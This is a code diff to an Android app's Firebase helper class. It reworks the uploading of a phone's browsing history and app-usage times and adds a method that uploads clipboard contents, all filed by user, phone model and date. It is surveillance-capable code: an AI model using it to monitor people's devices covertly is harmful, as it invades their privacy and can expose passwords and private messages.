@@ -4,8 +4,10 @@ import static android.content.ContentValues.TAG;
 
 import android.util.Log;
 
+import com.google.android.gms.tasks.Tasks;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+import com.google.android.gms.tasks.Task;
 
 import java.util.Date;
 import java.util.Locale;
@@ -166,66 +168,103 @@ public class DatabaseHelper {
         }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
     }
 
-    public static void uploadWebVisitDataByDate(String userId, String phoneModel, WebVisitData visitData) {
+    public Task<Void> uploadWebVisitDataByDate(String userId, String phoneModel, WebVisitData visitData) {
         // Generate unique ID using timestamp and a random string
         String timestamp = String.valueOf(visitData.getTimestamp());
         String randomId = UUID.randomUUID().toString();  // Directly generate the random string
         String uniqueKey = timestamp + "_" + randomId;  // Unique ID based on timestamp and random ID
 
-        // Convert the Date object to a String
+        // Format the date for the visit
         SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
-        String dateString = visitData.getDate() != null ? dateFormat.format(visitData.getDate()) : "";
+        String date = dateFormat.format(new Date(visitData.getTimestamp()));
 
-        // Reference to the web visit data in Firebase
-        DatabaseReference webRef = getPhoneDataReference(userId, phoneModel, "web_visits", uniqueKey, dateString);
+        // Reference to the web visit data in Firebase, stored date-wise
+        DatabaseReference webRef = database.child(userId)
+                .child("phones")
+                .child(phoneModel)
+                .child("web_visits")
+                .child(date) // Store data under the date
+                .child(uniqueKey); // Use unique key for each visit
 
-        // Upload the web visit data directly
+        // Create a map to store the web visit data
         Map<String, Object> webMap = new HashMap<>();
         webMap.put("url", visitData.getUrl());
         webMap.put("title", visitData.getTitle());
         webMap.put("timestamp", visitData.getTimestamp());
-        webMap.put("date", dateString);
 
         // Upload the data
-        webRef.setValue(webMap).addOnSuccessListener(aVoid -> {
-                    Log.d(TAG, "Web visit data uploaded successfully.");
-                })
-                .addOnFailureListener(e -> {
-                    Log.e(TAG, "Failed to upload web visit data: " + e.getMessage());
-                });
+        return webRef.setValue(webMap)
+                .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Web visit data uploaded successfully."))
+                .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload web visit data: " + e.getMessage()));
     }
 
 
     public void uploadAppUsageDataByDate(String userId, String phoneModel, AppUsageData appUsageData) {
-        // Generate unique ID using timestamp and a random string
-        String timestamp = String.valueOf(appUsageData.getTimestamp());
-        String randomId = UUID.randomUUID().toString();  // Generate a random string for uniqueness
-        String uniqueKey = timestamp + "_" + randomId;  // Unique key formed by combining timestamp and random ID
 
-        // Convert the current timestamp into a Date object and format it to a string (yyyy-MM-dd)
+        String sanitizedPackageName = sanitizePath(appUsageData.getPackageName());
+
+        // Get the formatted date (yyyy-MM-dd)
         SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
-        String dateString = dateFormat.format(new Date(appUsageData.getTimestamp()));  // Format to "yyyy-MM-dd"
+        String date = dateFormat.format(new Date(appUsageData.getTimestamp()));
 
-        // Reference to the Firebase node where the app usage data will be uploaded
-        DatabaseReference appUsageRef = getPhoneDataReference(userId, phoneModel, "app_usage", uniqueKey, dateString);
+        // Reference to the Firebase node
+        DatabaseReference usageRef = database.child(userId)
+                .child("phones")
+                .child(phoneModel)
+                .child("app_usage")
+                .child(date)
+                .child(sanitizedPackageName); // Use package name as unique ID for the day
 
-        // Prepare the data to upload
-        Map<String, Object> appUsageMap = new HashMap<>();
-        appUsageMap.put("app_name", appUsageData.getAppName());
-        appUsageMap.put("package_name", appUsageData.getPackageName());
-        appUsageMap.put("usage_duration", appUsageData.getUsageDuration());
-        appUsageMap.put("timestamp", appUsageData.getTimestamp());
-        appUsageMap.put("date", dateString);
+        // Fetch existing data from Firebase
+        usageRef.get().addOnSuccessListener(dataSnapshot -> {
+            long existingDuration = 0;
 
-        // Upload the app usage data to Firebase
-        appUsageRef.setValue(appUsageMap).addOnSuccessListener(aVoid -> {
-                    Log.d(TAG, "App usage data uploaded successfully.");
-                })
-                .addOnFailureListener(e -> {
-                    Log.e(TAG, "Failed to upload app usage data: " + e.getMessage());
-                });
+            if (dataSnapshot.exists() && dataSnapshot.hasChild("usage_duration")) {
+                // Retrieve the current duration from Firebase
+                existingDuration = dataSnapshot.child("usage_duration").getValue(Long.class);
+            }
+
+            // Add the new duration to the existing duration
+            long updatedDuration = existingDuration + appUsageData.getUsageDuration();
+
+            // Prepare the updated data
+            Map<String, Object> appUsageMap = new HashMap<>();
+            appUsageMap.put("package_name", appUsageData.getPackageName());
+            appUsageMap.put("usage_duration", updatedDuration);
+            appUsageMap.put("timestamp", appUsageData.getTimestamp());
+            appUsageMap.put("date", date);
+
+            // Upload the updated data to Firebase
+            usageRef.setValue(appUsageMap)
+                    .addOnSuccessListener(aVoid -> Log.d(TAG, "App usage data updated successfully."))
+                    .addOnFailureListener(e -> Log.e(TAG, "Failed to update app usage data: " + e.getMessage()));
+        }).addOnFailureListener(e -> Log.e(TAG, "Failed to fetch existing data: " + e.getMessage()));
     }
 
+    public static void uploadClipboardDataByDate(String userId, String phoneModel, ClipboardData clipboardData) {
+        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
+        DatabaseReference ref = FirebaseDatabase.getInstance().getReference("users")
+                .child(userId)
+                .child("phones")
+                .child(phoneModel)
+                .child("clipboard")
+                .child(date);
+
+        String key = ref.push().getKey();
+        if (key != null) {
+            // Create a map for the clipboard data to be uploaded
+            Map<String, Object> clipboardMap = new HashMap<>();
+            clipboardMap.put("content", clipboardData.getContent());
+            clipboardMap.put("timestamp", clipboardData.getTimestamp());
+
+            // Upload the clipboard data to Firebase
+            ref.child(key).setValue(clipboardMap)
+                    .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Clipboard data uploaded successfully."))
+                    .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload clipboard data: " + e.getMessage()));
+        } else {
+            Log.e("DatabaseHelper", "Failed to generate database key");
+        }
+    }
 
 
     // Helper function to sanitize paths and remove invalid characters
